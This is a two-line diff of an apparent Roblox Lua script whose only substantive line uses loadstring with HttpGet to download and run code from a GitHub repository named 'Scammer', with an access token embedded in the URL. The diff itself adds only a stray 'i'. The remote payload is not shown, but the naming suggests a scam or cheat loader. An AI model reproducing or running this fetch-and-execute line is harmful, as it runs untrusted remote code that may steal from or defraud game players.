@@ -1,1 +1,2 @@
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Darkspawnersgrowagarden/Scammer/refs/heads/main/3e908220451721064dbab689c280206b.txt?token=GHSAT0AAAAAADF4A2C7RUIFIOX3GZ4WBPSE2C5YRTQ"))()
+i
